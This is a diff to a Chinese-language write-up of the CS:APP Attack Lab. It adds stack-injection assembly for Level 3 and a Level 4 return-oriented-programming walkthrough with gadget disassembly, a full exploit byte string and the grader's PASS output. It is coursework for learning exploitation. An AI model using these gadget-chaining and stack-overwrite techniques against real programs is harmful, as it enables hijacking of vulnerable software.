@@ -271,6 +271,20 @@ FAIL: Would have posted the following:
 - 我的字符串地址 0x5561dc85 在 %rsp 以下，所以很容易被踩坏，hexmatch 比较时就失败。
 
 所以只需要将字符串的位置放置在返回地址的上面就可以了，修改一下输入文件的值再次尝试。
+```assembly
+.text                   # 代码（指令）
+.globl _start           # 全局符号_start，链接器从这里开始执行
+_start:                 # 程序入口
+mov    %rsp, %rdi       # rdi = 当前栈指针
+pushq $0x4018fa         # 将touch3函数的地址压入栈中
+ret                     # 返回到touch3函数
+
+# 强制把字符串放在 0x402000 地址
+.org 0x5561dca8        # 关键！指定地址
+my_str:
+    .string "59b997fa"  # 字符串
+```
+
 ```
 0000000000000000 <_start>:
            0:   48 89 e7                mov    %rsp,%rdi
@@ -299,6 +313,60 @@ PASS: Would have posted the following:
 [Inferior 1 (process 32849) exited normally]
 ```
 可以发现我们成功调用了`touch3()`函数，并且成功通过了`hexmatch()`函数的验证，完成了攻击实验的第三级。
+
+## Level 4
+
+***Return-Oriented-Programming (ROP)***
+
+对程序RTARGET执行代码注入攻击要比`CTARGET`困难，因为使用两种技术来阻止这种攻击：
+- 他使用随机化，以便堆栈的位置每次运行时都会不同。这使得无法确定注入的代码位于何处。
+- 他使用了一个保护机制，称为**不可执行栈**，这意味着即使你成功地将代码注入到栈中，也无法执行它。
+
+ROP的策略是在现有程序中识别字节序列，该程序由一个或多个指令组成，后面跟着指令ret. 这些字节序列被称为**gadgets**，我们可以使用这些gadgets来构建一个攻击链，以实现我们想要的功能。
+
+### some advice
+
+- 只需要两个小工具就可以完成这个攻击
+- 只使用前8个x86-64指令集的寄存器（%rax, %rbx, %rcx, %rdx, %rsi, %rdi, %rsp, %rbp）来构建攻击链
+
+阅读README文件，将重复第二阶段的攻击，但是使用你的小工具场中的小工具在`RTARGET`上攻击，只需要两个小工具就可以完成这个攻击，回顾一下阶段二的任务，我们需要覆盖掉返回地址，使其返回`touch2()`函数，同时还需要注入代码来修改%rdi的值，使其等于cookie的值，这样才能成功调用`touch2()`函数.
+
+我们发现，禁止的是`执行栈上的字节`，不是`改返回地址`，所以我们需要通过改返回地址去执行现有代码段里的gadget来修改%rdi的值，使其等于cookie的值，然后再返回到`touch2()`函数。同时gadget有效的指令并不是从首字节开始的，所以我们设置返回地址的时候要加上偏移量，才能正确的执行gadget中的指令。
+
+`gadget(1)(pop rax) -- > cookie --> gadget(2) --> touch2()`，这个gadget的功能是将栈顶的值弹出到%rdi寄存器中，然后返回到下一个地址.
+
+我们在rtarget中找到我们想要的gadget
+```assembly
+00000000004019c3 <setval_426>: # 89,movl eax edi,nop ret
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+
+00000000004019ca <getval_280>: # 58，pop rax nop ret 
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3                   	retq
+```
+这两个gadget正好可以让我们将cookie的值放入%rdi寄存器中，并且返回到`touch2()`函数中.
+
+构建`exploit.txt`文件，先填充0x28字节，然后用gadget(1)的地址覆盖返回地址，接着是cookie的值，最后是gadget(2)的地址和`touch2()`函数的地址。这里需要弄清楚`ret : %rip = *%rsp++, jmp %rip`,`pop : %rax = *%rsp++`，就可以弄清楚`%rsp的变化`，自然知道每个地址和数据应该放在什么位置了。
+
+```
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 cc 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c6 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
+```
+
+```
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C6 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
+```
+可见我们成功调用了`touch2()`函数，并且成功通过了验证，完成了攻击实验的第四级。 已经完成了***95/100***😄.
+
+## Level 5
+
 
 
 
